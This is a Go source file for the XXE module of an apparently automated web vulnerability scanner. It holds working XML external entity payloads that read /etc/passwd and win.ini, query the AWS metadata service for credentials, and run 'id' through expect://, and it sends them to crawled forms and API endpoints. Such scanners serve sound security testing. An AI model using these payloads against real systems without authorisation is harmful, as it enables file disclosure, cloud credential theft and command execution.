package xxe

import (
	"io"
	"strings"

	"github.com/eonedge/vulnscan/pkg/crawler"
	"github.com/eonedge/vulnscan/pkg/scanner"
	"github.com/eonedge/vulnscan/pkg/utils"
)

// XXEModule implements XML External Entity vulnerability scanning
type XXEModule struct {
	CustomPayloads []utils.Payload
}

// NewXXEModule creates a new XXE module
func NewXXEModule() *XXEModule {
	return &XXEModule{}
}

// NewXXEModuleWithPayloads creates a new XXE module with custom payloads
func NewXXEModuleWithPayloads(payloads []utils.Payload) *XXEModule {
	return &XXEModule{CustomPayloads: payloads}
}

func (m *XXEModule) Name() string        { return "xxe" }
func (m *XXEModule) Description() string  { return "XML External Entity (XXE) vulnerability scanner" }

// Scan scans an endpoint for XXE vulnerabilities
func (m *XXEModule) Scan(client *utils.HTTPClient, endpoint crawler.Endpoint) []scanner.Vulnerability {
	var vulns []scanner.Vulnerability

	// XXE payloads
	payloads := []struct {
		payload    string
		pattern    string
		severity   scanner.Severity
		desc       string
	}{
		{
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "XXE via file protocol to read /etc/passwd",
		},
		{
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>`,
			pattern:  "\\[fonts\\]",
			severity: scanner.SeverityCritical,
			desc:     "XXE via file protocol to read Windows win.ini",
		},
		{
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>`,
			pattern:  "(?i)(ami-id|instance-id|security-credentials)",
			severity: scanner.SeverityCritical,
			desc:     "XXE via SSRF to AWS metadata",
		},
		{
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
<foo>&xxe;</foo>`,
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "XXE via PHP filter wrapper",
		},
		{
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>&xxe;</foo>`,
			pattern:  "(?i)(uid=\\d+|groups=)",
			severity: scanner.SeverityCritical,
			desc:     "XXE via expect protocol for command execution",
		},
	}

	// Add custom payloads
	for _, cp := range m.CustomPayloads {
		pattern := cp.Pattern
		if pattern == "" {
			pattern = "root:.*:0:0:"
		}
		desc := cp.Description
		if desc == "" {
			desc = "Custom XXE payload"
		}
		payloads = append(payloads, struct {
			payload    string
			pattern    string
			severity   scanner.Severity
			desc       string
		}{
			payload:  cp.Value,
			pattern:  pattern,
			severity: scanner.SeverityCritical,
			desc:     desc,
		})
	}

	// Check if endpoint might accept XML
	for _, form := range endpoint.Forms {
		// Check for XML-related content types or file uploads
		hasFileInput := false
		for inputName := range form.Inputs {
			lowerName := strings.ToLower(inputName)
			if strings.Contains(lowerName, "file") || strings.Contains(lowerName, "upload") || strings.Contains(lowerName, "xml") {
				hasFileInput = true
				break
			}
		}

		if hasFileInput || strings.Contains(strings.ToLower(form.Action), "xml") || strings.Contains(strings.ToLower(form.Action), "api") {
			for _, p := range payloads {
				// Try POST with XML content
				resp, err := client.PostJSON(form.Action, p.payload)
				if err != nil {
					continue
				}

				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)

				if utils.ContainsPattern(bodyStr, p.pattern) {
					vuln := scanner.Vulnerability{
						Type:        "XXE",
						Severity:    p.severity,
						URL:         form.Action,
						Parameter:   "XML body",
						Payload:     p.payload,
						Description: p.desc,
						Evidence:    utils.ExtractContext(bodyStr, p.payload),
						Timestamp:   utils.GetCurrentTime(),
					}
					vulns = append(vulns, vuln)
				}
			}
		}
	}

	// Also try endpoints that might accept XML
	if strings.Contains(strings.ToLower(endpoint.URL), "xml") || 
	   strings.Contains(strings.ToLower(endpoint.URL), "api") ||
	   strings.Contains(strings.ToLower(endpoint.URL), "soap") {
		for _, p := range payloads {
			resp, err := client.PostJSON(endpoint.URL, p.payload)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if utils.ContainsPattern(bodyStr, p.pattern) {
				vuln := scanner.Vulnerability{
					Type:        "XXE",
					Severity:    p.severity,
					URL:         endpoint.URL,
					Parameter:   "XML body",
					Payload:     p.payload,
					Description: p.desc,
					Evidence:    utils.ExtractContext(bodyStr, p.payload),
					Timestamp:   utils.GetCurrentTime(),
				}
				vulns = append(vulns, vuln)
			}
		}
	}

	return vulns
}
